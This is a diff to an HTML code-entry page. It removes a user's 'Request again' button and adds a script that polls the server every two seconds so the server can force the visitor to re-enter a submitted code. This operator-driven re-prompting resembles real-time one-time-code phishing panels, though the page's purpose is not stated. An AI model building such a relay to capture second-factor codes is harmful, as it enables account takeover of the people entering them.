@@ -92,13 +92,14 @@
             <input type="text" id="code-input" name="code" placeholder="Enter your code" required autocomplete="off">
             <button type="submit">Send</button>
         </form>
-        <button id="request-again" style="margin-top:18px;background:#fff;color:#16b6ff;border:1.5px solid #16b6ff;">Request again</button>
         <div id="message" style="margin-top:14px;color:#16b6ff;font-size:1rem;font-weight:500;"></div>
     </div>
     <script>
+        let lastCode = '';
         document.getElementById('code-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             const code = document.getElementById('code-input').value;
+            lastCode = code;
             try {
                 const response = await fetch('/send_code', {
                     method: 'POST',
@@ -114,11 +115,19 @@
                 alert('Error sending code');
             }
         });
-        document.getElementById('request-again').onclick = function() {
-            document.getElementById('code-input').value = '';
-            document.getElementById('code-input').focus();
-            document.getElementById('message').textContent = 'Please enter the code again';
-        };
+        // Polling for request_again
+        setInterval(async function() {
+            if (!lastCode) return;
+            try {
+                const resp = await fetch('/check_request_again?code=' + encodeURIComponent(lastCode));
+                const txt = await resp.text();
+                if (txt === 'true') {
+                    document.getElementById('code-input').value = '';
+                    document.getElementById('message').textContent = 'Please enter the code again';
+                    lastCode = '';
+                }
+            } catch (e) {}
+        }, 2000);
     </script>
 </body>
 </html> 
